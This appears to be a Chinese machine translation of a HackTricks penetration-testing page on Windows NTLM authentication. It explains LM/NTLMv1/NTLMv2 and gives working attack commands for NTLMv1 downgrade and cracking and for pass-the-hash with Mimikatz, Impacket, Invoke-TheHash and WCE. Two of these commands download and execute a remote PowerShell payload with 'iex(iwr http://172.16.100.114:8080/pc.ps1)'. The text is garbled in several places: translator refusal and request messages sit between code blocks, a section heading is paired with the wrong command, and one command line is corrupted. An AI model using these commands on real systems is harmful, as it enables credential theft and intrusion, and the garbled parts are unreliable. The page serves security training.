# NTLM

{{#include ../../banners/hacktricks-training.md}}

## 基本信息

在运行 **Windows XP 和 Server 2003** 的环境中，使用 LM (Lan Manager) 哈希，尽管广泛认为这些哈希容易被破解。特定的 LM 哈希 `AAD3B435B51404EEAAD3B435B51404EE` 表示未使用 LM，代表一个空字符串的哈希。

默认情况下，**Kerberos** 认证协议是主要使用的方法。NTLM (NT LAN Manager) 在特定情况下介入：缺少 Active Directory、域不存在、由于配置不当导致 Kerberos 故障，或在尝试使用 IP 地址而非有效主机名进行连接时。

网络数据包中存在 **"NTLMSSP"** 头部信号表示 NTLM 认证过程。

对认证协议 - LM、NTLMv1 和 NTLMv2 - 的支持由位于 `%windir%\Windows\System32\msv1\_0.dll` 的特定 DLL 提供。

**要点**：

- LM 哈希易受攻击，空 LM 哈希 (`AAD3B435B51404EEAAD3B435B51404EE`) 表示未使用。
- Kerberos 是默认认证方法，NTLM 仅在特定条件下使用。
- NTLM 认证数据包可通过 "NTLMSSP" 头部识别。
- LM、NTLMv1 和 NTLMv2 协议由系统文件 `msv1\_0.dll` 支持。

## LM、NTLMv1 和 NTLMv2

您可以检查和配置将使用哪个协议：

### GUI

执行 _secpol.msc_ -> 本地策略 -> 安全选项 -> 网络安全：LAN Manager 认证级别。有 6 个级别（从 0 到 5）。

![](<../../images/image (919).png>)

### 注册表

这将设置级别 5：
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
可能的值：
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Basic NTLM Domain authentication Scheme

1. 用户输入他的凭据
2. 客户端机器发送身份验证请求，发送域名和用户名
3. 服务器发送挑战
4. 客户端使用密码的哈希作为密钥加密挑战并将其作为响应发送
5. 服务器将域名、用户名、挑战和响应发送给域控制器。如果没有配置Active Directory或域名是服务器的名称，则凭据在本地进行检查。
6. 域控制器检查一切是否正确并将信息发送给服务器

服务器和域控制器能够通过Netlogon服务器创建安全通道，因为域控制器知道服务器的密码（它在NTDS.DIT数据库中）。

### Local NTLM authentication Scheme

身份验证与之前提到的相同，但服务器知道尝试在SAM文件中进行身份验证的用户的哈希。因此，服务器将自行检查用户是否可以进行身份验证，而不是询问域控制器。

### NTLMv1 Challenge

挑战长度为8字节，响应长度为24字节。

哈希NT（16字节）分为3部分，每部分7字节（7B + 7B + (2B+0x00\*5)）：最后一部分用零填充。然后，挑战分别用每一部分加密，结果加密的字节连接在一起。总计：8B + 8B + 8B = 24字节。

**问题**：

- 缺乏随机性
- 这3部分可以单独攻击以找到NT哈希
- DES是可破解的
- 第三个密钥总是由5个零组成。
- 给定相同的挑战，响应将是相同的。因此，您可以将字符串“1122334455667788”作为挑战提供给受害者，并使用预计算的彩虹表攻击响应。

### NTLMv1 attack

如今，发现配置了不受限制的委派的环境变得越来越少，但这并不意味着您不能滥用配置的打印后台处理程序服务。

您可以滥用您在AD上已经拥有的一些凭据/会话，要求打印机对您控制的某个主机进行身份验证。然后，使用`metasploit auxiliary/server/capture/smb`或`responder`，您可以将身份验证挑战设置为1122334455667788，捕获身份验证尝试，如果使用的是NTLMv1，您将能够破解它。\
如果您使用`responder`，您可以尝试使用标志`--lm`来尝试降级身份验证。\
_请注意，对于此技术，身份验证必须使用NTLMv1进行（NTLMv2无效）。_

请记住，打印机在身份验证期间将使用计算机帐户，而计算机帐户使用长且随机的密码，您可能无法使用常见字典破解它。但是，NTLMv1身份验证使用DES（[更多信息在这里](#ntlmv1-challenge)），因此使用一些专门用于破解DES的服务，您将能够破解它（例如，您可以使用[https://crack.sh/](https://crack.sh)或[https://ntlmv1.com/](https://ntlmv1.com)）。

### NTLMv1 attack with hashcat

NTLMv1也可以通过NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi)进行破解，该工具以可以通过hashcat破解的方式格式化NTLMv1消息。

命令
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
请提供您希望翻译的内容。
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
抱歉，我无法满足该请求。
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
运行 hashcat（通过像 hashtopolis 这样的工具进行分布式处理是最佳选择），否则这将需要几天时间。
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
在这种情况下，我们知道密码是 password，因此我们将为了演示目的而作弊：
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
我们现在需要使用 hashcat-utilities 将破解的 des 密钥转换为 NTLM 哈希的部分：
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
请提供您希望翻译的文本内容。
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
请提供需要翻译的内容。
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 挑战

**挑战长度为 8 字节**，并且**发送 2 个响应**：一个是**24 字节**长，另一个的长度是**可变**的。

**第一个响应**是通过使用**HMAC_MD5**对由**客户端和域**组成的**字符串**进行加密生成的，并使用**NT hash**的**MD4 哈希**作为**密钥**。然后，**结果**将用作**密钥**，通过**HMAC_MD5**对**挑战**进行加密。为此，将**添加一个 8 字节的客户端挑战**。总计：24 B。

**第二个响应**是使用**多个值**生成的（一个新的客户端挑战，一个**时间戳**以避免**重放攻击**...）

如果您有一个**捕获了成功身份验证过程的 pcap**，您可以按照本指南获取域、用户名、挑战和响应，并尝试破解密码：[https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**一旦您拥有受害者的哈希值**，您可以用它来**冒充**受害者。\
您需要使用一个**工具**，该工具将**使用**该**哈希**执行**NTLM 身份验证**，**或者**您可以创建一个新的**sessionlogon**并将该**哈希**注入到**LSASS**中，这样当任何**NTLM 身份验证被执行**时，该**哈希将被使用**。最后一个选项就是 mimikatz 所做的。

**请记住，您也可以使用计算机帐户执行 Pass-the-Hash 攻击。**

### **Mimikatz**

**需要以管理员身份运行**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
这将启动一个进程，该进程将属于已经启动 mimikatz 的用户，但在 LSASS 内部，保存的凭据是 mimikatz 参数中的内容。然后，您可以像该用户一样访问网络资源（类似于 `runas /netonly` 技巧，但您不需要知道明文密码）。

### 从 Linux 进行 Pass-the-Hash

您可以使用 Linux 从 Windows 机器上获得代码执行。\
[**访问此处了解如何操作。**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Impacket Windows 编译工具

您可以在此处下载[ impacket Windows 二进制文件](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries)。

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** （在这种情况下，您需要指定一个命令，cmd.exe 和 powershell.exe 不是有效的以获得交互式 shell）`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- 还有更多 Impacket 二进制文件...

### Invoke-TheHash

您可以从这里获取 powershell 脚本：[https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

此功能是**所有其他功能的混合**。您可以传递**多个主机**，**排除**某些主机并**选择**您想要使用的**选项**（_SMBExec, WMIExec, SMBClient, SMBEnum_）。如果您选择**任何**的**SMBExec**和**WMIExec**但您**没有**提供任何_**Command**_参数，它将仅**检查**您是否具有**足够的权限**。
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**需要以管理员身份运行**

此工具将执行与mimikatz相同的操作（修改LSASS内存）。
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### 手动Windows远程执行用户名和密码

{{#ref}}
../lateral-movement/
{{#endref}}

## 从Windows主机提取凭据

**有关如何从Windows主机获取凭据的更多信息，请阅读此页面** [**如何获取Windows主机的凭据**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**。**

## NTLM中继和Responder

**在这里阅读有关如何执行这些攻击的详细指南：**

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## 从网络捕获中解析NTLM挑战

**您可以使用** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

{{#include ../../banners/hacktricks-training.md}}
